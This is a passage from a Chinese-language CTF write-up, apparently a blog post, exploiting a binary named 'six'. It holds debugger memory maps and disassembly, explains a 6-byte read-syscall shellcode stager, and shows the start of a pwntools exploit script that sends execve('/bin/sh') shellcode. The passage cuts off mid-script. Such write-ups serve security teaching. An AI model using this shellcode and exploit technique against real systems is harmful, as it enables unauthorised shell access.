   <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第二块分配前</span><br><span class="line"> ► <span class="number">0x555555554adc</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xeccb72e06000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x3</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第二块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff5000</span>     <span class="number">0x7ffff7ff6000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      第二块</span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>我们看看，src处的数据到底是什么。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202020 src             db 48h ; H                 ; DATA XREF: main+71↑o</span><br><span class="line">.data:0000000000202020                                         ; main+87↑o ...</span><br><span class="line">.data:0000000000202021                 db  89h</span><br><span class="line">.data:0000000000202022                 db 0FCh</span><br><span class="line">.data:0000000000202023                 db  48h ; H</span><br><span class="line">.data:0000000000202024                 db  31h ; 1</span><br><span class="line">.data:0000000000202025                 db 0EDh</span><br><span class="line">.data:0000000000202026                 db  48h ; H</span><br><span class="line">.data:0000000000202027                 db  31h ; 1</span><br><span class="line">.data:0000000000202028                 db 0C0h</span><br><span class="line">.data:0000000000202029                 db  48h ; H</span><br><span class="line">.data:000000000020202A                 db  31h ; 1</span><br><span class="line">.data:000000000020202B                 db 0DBh</span><br><span class="line">.data:000000000020202C                 db  48h ; H</span><br><span class="line">.data:000000000020202D                 db  31h ; 1</span><br><span class="line">.data:000000000020202E                 db 0C9h</span><br><span class="line">.data:000000000020202F                 db  48h ; H</span><br><span class="line">.data:0000000000202030                 db  31h ; 1</span><br><span class="line">.data:0000000000202031                 db 0D2h</span><br><span class="line">.data:0000000000202032                 db  48h ; H</span><br><span class="line">.data:0000000000202033                 db  31h ; 1</span><br><span class="line">.data:0000000000202034                 db 0FFh</span><br><span class="line">.data:0000000000202035                 db  48h ; H</span><br><span class="line">.data:0000000000202036                 db  31h ; 1</span><br><span class="line">.data:0000000000202037                 db 0F6h</span><br><span class="line">.data:0000000000202038                 db  4Dh ; M</span><br><span class="line">.data:0000000000202039                 db  31h ; 1</span><br><span class="line">.data:000000000020203A                 db 0C0h</span><br><span class="line">.data:000000000020203B                 db  4Dh ; M</span><br><span class="line">.data:000000000020203C                 db  31h ; 1</span><br><span class="line">.data:000000000020203D                 db 0C9h</span><br><span class="line">.data:000000000020203E                 db  4Dh ; M</span><br><span class="line">.data:000000000020203F                 db  31h ; 1</span><br><span class="line">.data:0000000000202040                 db 0D2h</span><br><span class="line">.data:0000000000202041                 db  4Dh ; M</span><br><span class="line">.data:0000000000202042                 db  31h ; 1</span><br><span class="line">.data:0000000000202043                 db 0DBh</span><br><span class="line">.data:0000000000202044                 db  4Dh ; M</span><br><span class="line">.data:0000000000202045                 db  31h ; 1</span><br><span class="line">.data:0000000000202046                 db 0E4h</span><br><span class="line">.data:0000000000202047                 db  4Dh ; M</span><br><span class="line">.data:0000000000202048                 db  31h ; 1</span><br><span class="line">.data:0000000000202049                 db 0EDh</span><br><span class="line">.data:000000000020204A                 db  4Dh ; M</span><br><span class="line">.data:000000000020204B                 db  31h ; 1</span><br><span class="line">.data:000000000020204C                 db 0F6h</span><br><span class="line">.data:000000000020204D                 db  4Dh ; M</span><br><span class="line">.data:000000000020204E                 db  31h ; 1</span><br><span class="line">.data:000000000020204F                 db 0FFh</span><br><span class="line">.data:0000000000202050                 db    0</span><br><span class="line">.data:0000000000202051                 db    0</span><br></pre></td></tr></table></figure>
<p>这里四种方法(我知道的)可以将一串16进制机器码转换为汇编代码：</p>
<blockquote>
<p>1、直接使用IDA进行转换，工具条或者快捷键<br>2、使用nasm的ndisasm进行反汇编，ndisasm.exe -b 64 文件名，文件为包含机器码的bin文件<br>3、使用Pwndbg的disasm命令，disasm -c amd64 ‘str’,str为机器码16进制字符串<br>4、使用pwntools的disasm()，print disasm(‘str’.decode(‘hex’),arch = ‘amd64’),str同样为机器码16进制字符串</p>
</blockquote>
<p>既然src的数据可以执行，我们将这串机器码反汇编，然后得到如下代码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、IDA转换</span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202021</span> <span class="number">48</span> <span class="number">89</span> FC      <span class="keyword">mov</span>     <span class="built_in">rsp</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202023</span> <span class="number">48</span> <span class="number">31</span> ED      <span class="keyword">xor</span>     <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202026</span> <span class="number">48</span> <span class="number">31</span> C0      <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202029</span> <span class="number">48</span> <span class="number">31</span> <span class="built_in">DB</span>      <span class="keyword">xor</span>     <span class="built_in">rbx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020202C <span class="number">48</span> <span class="number">31</span> C9      <span class="keyword">xor</span>     <span class="built_in">rcx</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020202F <span class="number">48</span> <span class="number">31</span> D2      <span class="keyword">xor</span>     <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202032</span> <span class="number">48</span> <span class="number">31</span> FF      <span class="keyword">xor</span>     <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202035</span> <span class="number">48</span> <span class="number">31</span> F6      <span class="keyword">xor</span>     <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202038</span> <span class="number">4D</span> <span class="number">31</span> C0      <span class="keyword">xor</span>     <span class="built_in">r8</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020203B <span class="number">4D</span> <span class="number">31</span> C9      <span class="keyword">xor</span>     <span class="built_in">r9</span>, <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020203E <span class="number">4D</span> <span class="number">31</span> D2      <span class="keyword">xor</span>     <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202041</span> <span class="number">4D</span> <span class="number">31</span> <span class="built_in">DB</span>      <span class="keyword">xor</span>     <span class="built_in">r11</span>, <span class="built_in">r11</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202044</span> <span class="number">4D</span> <span class="number">31</span> E4      <span class="keyword">xor</span>     <span class="built_in">r12</span>, <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202047</span> <span class="number">4D</span> <span class="number">31</span> ED      <span class="keyword">xor</span>     <span class="built_in">r13</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.data:</span>000000000020204A <span class="number">4D</span> <span class="number">31</span> F6      <span class="keyword">xor</span>     <span class="built_in">r14</span>, <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">000000000020204D</span> <span class="number">4D</span> <span class="number">31</span> FF      <span class="keyword">xor</span>     <span class="built_in">r15</span>, <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、ndisasm转换</span><br><span class="line">λ ndisasm.exe -b <span class="number">64</span> lblb.bin</span><br><span class="line"><span class="number">00000000</span>  4889FC            <span class="keyword">mov</span> <span class="built_in">rsp</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">00000003</span>  4831ED            <span class="keyword">xor</span> <span class="built_in">rbp</span>,<span class="built_in">rbp</span></span><br><span class="line"><span class="number">00000006</span>  4831C0            <span class="keyword">xor</span> <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">00000009</span>  4831<span class="built_in">DB</span>            <span class="keyword">xor</span> <span class="built_in">rbx</span>,<span class="built_in">rbx</span></span><br><span class="line">0000000C  4831C9            <span class="keyword">xor</span> <span class="built_in">rcx</span>,<span class="built_in">rcx</span></span><br><span class="line">0000000F  4831D2            <span class="keyword">xor</span> <span class="built_in">rdx</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">00000012</span>  4831FF            <span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">00000015</span>  4831F6            <span class="keyword">xor</span> <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">00000018</span>  4D31C0            <span class="keyword">xor</span> <span class="built_in">r8</span>,<span class="built_in">r8</span></span><br><span class="line"><span class="number">0000001B</span>  4D31C9            <span class="keyword">xor</span> <span class="built_in">r9</span>,<span class="built_in">r9</span></span><br><span class="line">0000001E  4D31D2            <span class="keyword">xor</span> <span class="built_in">r10</span>,<span class="built_in">r10</span></span><br><span class="line"><span class="number">00000021</span>  4D31DB            <span class="keyword">xor</span> <span class="built_in">r11</span>,<span class="built_in">r11</span></span><br><span class="line"><span class="number">00000024</span>  4D31E4            <span class="keyword">xor</span> <span class="built_in">r12</span>,<span class="built_in">r12</span></span><br><span class="line"><span class="number">00000027</span>  4D31ED            <span class="keyword">xor</span> <span class="built_in">r13</span>,<span class="built_in">r13</span></span><br><span class="line">0000002A  4D31F6            <span class="keyword">xor</span> <span class="built_in">r14</span>,<span class="built_in">r14</span></span><br><span class="line"><span class="number">0000002D</span>  4D31FF            <span class="keyword">xor</span> <span class="built_in">r15</span>,<span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、pwndbg的disasm转换</span><br><span class="line">pwndbg&gt; disasm -c amd64 <span class="string">'4889FC4831ED4831C04831DB4831C94831D24831FF4831F64D31C04D31C94D31D24D31DB4D31E44D31ED4D31F64D31FF'</span>   </span><br><span class="line">   <span class="number">0</span>:    <span class="number">48</span> <span class="number">89</span> fc                 <span class="keyword">mov</span>    <span class="built_in">rsp</span>, <span class="built_in">rdi</span></span><br><span class="line">   <span class="number">3</span>:    <span class="number">48</span> <span class="number">31</span> ed                 <span class="keyword">xor</span>    <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line">   <span class="number">6</span>:    <span class="number">48</span> <span class="number">31</span> c0                 <span class="keyword">xor</span>    <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">   <span class="number">9</span>:    <span class="number">48</span> <span class="number">31</span> <span class="built_in">db</span>                 <span class="keyword">xor</span>    <span class="built_in">rbx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">   c:</span>    <span class="number">48</span> <span class="number">31</span> c9                 <span class="keyword">xor</span>    <span class="built_in">rcx</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">   f:</span>    <span class="number">48</span> <span class="number">31</span> d2                 <span class="keyword">xor</span>    <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line">  <span class="number">12</span>:    <span class="number">48</span> <span class="number">31</span> ff                 <span class="keyword">xor</span>    <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line">  <span class="number">15</span>:    <span class="number">48</span> <span class="number">31</span> f6                 <span class="keyword">xor</span>    <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line">  <span class="number">18</span>:    <span class="number">4d</span> <span class="number">31</span> c0                 <span class="keyword">xor</span>    <span class="built_in">r8</span>, <span class="built_in">r8</span></span><br><span class="line">  <span class="number">1b</span>:    <span class="number">4d</span> <span class="number">31</span> c9                 <span class="keyword">xor</span>    <span class="built_in">r9</span>, <span class="built_in">r9</span></span><br><span class="line">  1e:    <span class="number">4d</span> <span class="number">31</span> d2                 <span class="keyword">xor</span>    <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line">  <span class="number">21</span>:    <span class="number">4d</span> <span class="number">31</span> <span class="built_in">db</span>                 <span class="keyword">xor</span>    <span class="built_in">r11</span>, <span class="built_in">r11</span></span><br><span class="line">  <span class="number">24</span>:    <span class="number">4d</span> <span class="number">31</span> e4                 <span class="keyword">xor</span>    <span class="built_in">r12</span>, <span class="built_in">r12</span></span><br><span class="line">  <span class="number">27</span>:    <span class="number">4d</span> <span class="number">31</span> ed                 <span class="keyword">xor</span>    <span class="built_in">r13</span>, <span class="built_in">r13</span></span><br><span class="line">  2a:    <span class="number">4d</span> <span class="number">31</span> f6                 <span class="keyword">xor</span>    <span class="built_in">r14</span>, <span class="built_in">r14</span></span><br><span class="line">  <span class="number">2d</span>:    <span class="number">4d</span> <span class="number">31</span> ff                 <span class="keyword">xor</span>    <span class="built_in">r15</span>, <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、pwntools的disasm()转换</span><br><span class="line">&gt;&gt;&gt; print disasm(<span class="string">'4889FC4831ED4831C04831DB4831C94831D24831FF4831F64D31C04D31C94D31D24D31DB4D31E44D31ED4D31F64D31FF'</span>.decode(<span class="string">'hex'</span>),arch = <span class="string">'amd64'</span>)</span><br><span class="line">   <span class="number">0</span>:   <span class="number">48</span> <span class="number">89</span> fc                <span class="keyword">mov</span>    <span class="built_in">rsp</span>,<span class="built_in">rdi</span></span><br><span class="line">   <span class="number">3</span>:   <span class="number">48</span> <span class="number">31</span> ed                <span class="keyword">xor</span>    <span class="built_in">rbp</span>,<span class="built_in">rbp</span></span><br><span class="line">   <span class="number">6</span>:   <span class="number">48</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line">   <span class="number">9</span>:   <span class="number">48</span> <span class="number">31</span> <span class="built_in">db</span>                <span class="keyword">xor</span>    <span class="built_in">rbx</span>,<span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">   c:</span>   <span class="number">48</span> <span class="number">31</span> c9                <span class="keyword">xor</span>    <span class="built_in">rcx</span>,<span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">   f:</span>   <span class="number">48</span> <span class="number">31</span> d2                <span class="keyword">xor</span>    <span class="built_in">rdx</span>,<span class="built_in">rdx</span></span><br><span class="line">  <span class="number">12</span>:   <span class="number">48</span> <span class="number">31</span> ff                <span class="keyword">xor</span>    <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">  <span class="number">15</span>:   <span class="number">48</span> <span class="number">31</span> f6                <span class="keyword">xor</span>    <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line">  <span class="number">18</span>:   <span class="number">4d</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    <span class="built_in">r8</span>,<span class="built_in">r8</span></span><br><span class="line">  <span class="number">1b</span>:   <span class="number">4d</span> <span class="number">31</span> c9                <span class="keyword">xor</span>    <span class="built_in">r9</span>,<span class="built_in">r9</span></span><br><span class="line">  1e:   <span class="number">4d</span> <span class="number">31</span> d2                <span class="keyword">xor</span>    <span class="built_in">r10</span>,<span class="built_in">r10</span></span><br><span class="line">  <span class="number">21</span>:   <span class="number">4d</span> <span class="number">31</span> <span class="built_in">db</span>                <span class="keyword">xor</span>    <span class="built_in">r11</span>,<span class="built_in">r11</span></span><br><span class="line">  <span class="number">24</span>:   <span class="number">4d</span> <span class="number">31</span> e4                <span class="keyword">xor</span>    <span class="built_in">r12</span>,<span class="built_in">r12</span></span><br><span class="line">  <span class="number">27</span>:   <span class="number">4d</span> <span class="number">31</span> ed                <span class="keyword">xor</span>    <span class="built_in">r13</span>,<span class="built_in">r13</span></span><br><span class="line">  2a:   <span class="number">4d</span> <span class="number">31</span> f6                <span class="keyword">xor</span>    <span class="built_in">r14</span>,<span class="built_in">r14</span></span><br><span class="line">  <span class="number">2d</span>:   <span class="number">4d</span> <span class="number">31</span> ff                <span class="keyword">xor</span>    <span class="built_in">r15</span>,<span class="built_in">r15</span></span><br></pre></td></tr></table></figure>
<p>我们可以看到，src处的代码功能为，将esp指向分配的具有可执行权限的内存块，并且将其他寄存器清0。执行完上述代码，就开始执行我们输入的6字节shellcode，6个字节直接获取shell是不可能的了，所以我们换种思路。通过调用0号系统调用read，将用于获取shell交互的shellcode读入一块可执行内存中，并且调用。我们从rsp开始写入数据，一直写到rip所指向的位置，就可以执行获取shell的shellcode了。</p>
<p>调用read的代码如下，也就是那六个字节的shellcode。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:    <span class="number">54</span>           <span class="keyword">push</span>   <span class="built_in">rsp</span></span><br><span class="line"><span class="number">1</span>:    5e           <span class="keyword">pop</span>    <span class="built_in">rsi</span></span><br><span class="line"><span class="number">2</span>:    <span class="number">89</span> f2        <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="number">4</span>:    0f <span class="number">05</span>        <span class="keyword">syscall</span></span><br><span class="line"><span class="comment">;54 5e 89 f2 0f 05</span></span><br></pre></td></tr></table></figure>
<p>接下来获取shell的shellcode，有两种方式，一种是直接使用pwntools生成的shellcode，另一种则是调用系统调用execve(/bin/sh).由于此利用方法的局限性，并不能每次都执行成功，只有当从/dev/urandom读出的两个地址都超出0x00007FFFFFFFFFFF时，mmap才会随机分配两块内存，才能满足利用的条件。</p>
<h4 id="0x03-exp-1"><a href="#0x03-exp-1" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><p>下面是exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./six'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    Io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Io = process(<span class="string">'./six'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(Io)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload1</span></span><br><span class="line">payload1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                push rsp</span></span><br><span class="line"><span class="string">                pop  rsi</span></span><br><span class="line"><span class="string">                mov  edx,esi</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                '''</span>) <span class="comment"># 545e89f20f05</span></span><br><span class="line"><span class="comment"># payload1 = chr(0x54) + chr(0x5e) + chr(0x89) + chr(0xf2) + chr(0x0F) + chr(0x05)</span></span><br><span class="line">Io.recvuntil(<span class="string">'Show Ne0 your shellcode:'</span>)</span><br><span class="line">Io.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload2</span></span><br><span class="line"><span class="comment"># one method of shell </span></span><br><span class="line">shell = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov eax,0x3b</span></span><br><span class="line"><span 